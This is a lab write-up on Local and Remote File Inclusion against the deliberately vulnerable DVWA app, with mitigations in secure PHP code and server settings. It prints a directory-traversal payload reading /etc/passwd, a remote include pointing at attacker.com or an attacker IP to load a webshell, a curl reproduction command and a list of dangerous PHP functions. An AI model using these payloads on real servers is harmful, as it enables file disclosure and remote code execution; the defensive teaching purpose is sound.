# DVWA — Local File Inclusion (LFI) & Remote File Inclusion (RFI) — Attack Scenarios + Mitigation

**Purpose:** Demonstrate Local File Inclusion (LFI) and Remote File Inclusion (RFI) on DVWA (low security), show example payloads you used, reproduction steps, and practical mitigations (server config and secure coding). Include reproduction commands, evidence, and GitHub commit instructions.

---

## Table of Contents

1. Overview
2. Environment
3. Attack scenarios

   * Local File Inclusion (LFI)
   * Remote File Inclusion (RFI)
4. Payloads you used
5. Reproduction steps
6. Mitigations (secure coding and server hardening)

   * PHP settings & Apache
   * Secure coding patterns (whitelists, canonicalization)
   * Additional server-level defenses
7. Detection & evidence collection
8. How to add this file to GitHub
9. Appendix & references

---

## 1. Overview

LFI and RFI vulnerabilities let an attacker include files into a server-side script. LFI reads local files (e.g., `/etc/passwd`), while RFI pulls remote files (which may contain executable code) into the application. DVWA `low` intentionally exposes these vulnerabilities for learning.

> **Warning:** Only perform these tests in a controlled environment (local VM / lab). Do not test systems you do not own or have explicit permission to test.

---

## 2. Environment

* Kali Linux (VM)
* DVWA installed and configured (security level: `low`)
* Web server: Apache (localhost / 127.0.0.1)
* PHP configured with default permissive settings in DVWA lab

Example DVWA LFI URL used in this demo:

```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=home.php
```

---

## 3. Attack scenarios

### A. Local File Inclusion (LFI)

**Goal:** Read sensitive files on the server (e.g., `/etc/passwd`, application configs, logs that may contain secrets).

**Why it works:** The application concatenates or directly uses an attacker-controlled `page` parameter in an `include()`/`require()` call without validating or canonicalizing the path.

### B. Remote File Inclusion (RFI)

**Goal:** Include a remote file containing attacker-supplied code (e.g., a PHP webshell) and execute it on the server. Example — attacker hosts a `csrf.html` or `shell.php` and causes the vulnerable app to `include()` it.

**Why it works (lab conditions):** `allow_url_include` or `allow_url_fopen` are enabled in PHP or the app directly fetches remote files and evaluates them.

---

## 4. Payloads you used

* **LFI (read `/etc/passwd`)** — URL parameter:

```
?page=../../../../../../etc/passwd
```

This performs directory traversal and includes `/etc/passwd` content into the page output.

* **RFI (include remote HTML / execute malicious code)** — attacker-hosted file `csrf.html` (or `shell.php`) and vulnerable include:

```
?page=http://attacker.com/csrf.html
```

`csrf.html` could contain HTML or JavaScript for CSRF or, if parsed as PHP on include, attacker-controlled PHP code (e.g., a webshell) if the server treats it as PHP.

---

## 5. Reproduction steps

**LFI reproduction:**

1. Set DVWA security to `low` and locate the file inclusion page (e.g., `vulnerabilities/fi/`).
2. In the `page` parameter supply the traversal payload:

```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

3. The response contains `/etc/passwd` content if vulnerable.

**RFI reproduction (lab only):**

1. Host a file `csrf.html` on an attacker-controlled webserver (e.g., `python3 -m http.server 80` in a directory containing `csrf.html`).
2. Use the vulnerable include parameter to point to your hosted file:

```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://<attacker-ip>/csrf.html
```

3. If the app is vulnerable to RFI and PHP is configured to allow URL includes, the remote contents will be included/executed by the server.

**Note:** Modern PHP default configs disable `allow_url_include` and many default setups prevent remote code execution, but DVWA `low` may be permissive for learning.

---

## 6. Mitigations (secure coding and server hardening)

### A. Secure coding patterns (preferred)

1. **Never include user input directly.** Replace dynamic includes with a server-side whitelist mapping.

```php
<?php
// bad: include($_GET['page']);
// good: whitelist mapping
$pages = [
  'home' => '/var/www/html/DVWA/pages/home.php',
  'about' => '/var/www/html/DVWA/pages/about.php',
];
$key = isset($_GET['page']) ? $_GET['page'] : 'home';
if (array_key_exists($key, $pages)) {
    include $pages[$key];
} else {
    // 404 or safe default
    include $pages['home'];
}
?>
```

2. **Canonicalize & validate paths** before use (use `realpath()` and ensure the resolved path is within an allowed directory):

```php
<?php
$basedir = '/var/www/html/DVWA/pages/';
$requested = isset($_GET['page']) ? $_GET['page'] : 'home.php';
$full = $basedir . $requested;
$real = realpath($full);
if ($real !== false && strpos($real, $basedir) === 0) {
    include $real;
} else {
    // invalid request
}
?>
```

3. **Avoid enabling remote includes.** Don't write code that relies on `allow_url_include` or fetching remote PHP to evaluate.

4. **Output encoding for file contents** when printing files (do not execute content):

```php
echo "<pre>" . htmlspecialchars($file_contents, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
```

### B. PHP / Apache configuration hardening

1. **Disable remote includes** in `php.ini` (recommended):

```
allow_url_fopen = Off
allow_url_include = Off
```

2. **Use `open_basedir`** to restrict PHP file operations to specific directories:

```
open_basedir = /var/www/html/:/tmp/:/usr/share/pear
```

3. **Remove dangerous functions** where possible (in `php.ini`):

```
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

4. **Run PHP as a least-privileged user** and ensure file permissions prevent web server from reading sensitive files like `/etc/shadow`.

5. **Use AppArmor/SELinux** profiles to restrict web server access to system files.

### C. Additional defenses

* **Logging & monitoring:** Monitor web server logs for suspicious `page=` parameters containing `../` sequences or remote URLs.
* **WAF rules:** Use ModSecurity or other WAF rules to block directory traversal patterns and external include attempts.
* **Code reviews & static analysis** to catch unsafe `include()`/`require()` usage.

---

## 7. Detection & evidence collection

* Save the vulnerable request and server response (e.g., `curl`):

```bash
curl -s "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd" -o lfi-response.txt
```

* Review Apache access and error logs:

```bash
sudo tail -n 200 /var/log/apache2/access.log
sudo tail -n 200 /var/log/apache2/error.log
```

* Capture the attacker's hosted file request logs (if hosting `csrf.html` locally with `python3 -m http.server`) to show inclusion attempts.

---



